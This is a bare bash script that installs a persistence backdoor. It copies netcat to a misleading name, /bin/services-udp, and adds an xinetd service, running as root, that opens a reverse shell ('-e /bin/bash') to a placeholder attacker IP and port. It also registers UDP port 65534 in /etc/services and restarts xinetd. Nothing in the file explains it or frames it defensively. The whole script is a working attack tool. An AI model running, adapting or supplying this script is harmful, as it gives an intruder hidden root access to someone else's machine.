#!/bin/bash

cp /bin/nc /bin/services-udp
echo "service services-udp" >/etc/xinetd.d/services-udp
echo "{" >> /etc/xinetd.d/services-udp
echo "		server = /bin/services-udp" >> /etc/xinetd.d/services-udp
echo "		server_args = <attacker_IP> <attacker_PORT> -e /bin/bash" >> /etc/xinetd.d/services-udp
echo "		protocol = udp" >> /etc/xinetd.d/services-udp
echo "		user = root" >> /etc/xinetd.d/services-udp
echo "		socket_type = dgram" >> /etc/xinetd.d/services-udp
echo "		wait = yes" >> /etc/xinetd.d/services-udp
echo "		flags = IPv4" >> /etc/xinetd.d/services-udp
echo "}" >> /etc/xinetd.d/services-udp

echo "services-udp	65534/udp       # services-udp" >> /etc/services

/etc/init.d/xinetd stop
/etc/init.d/xinetd start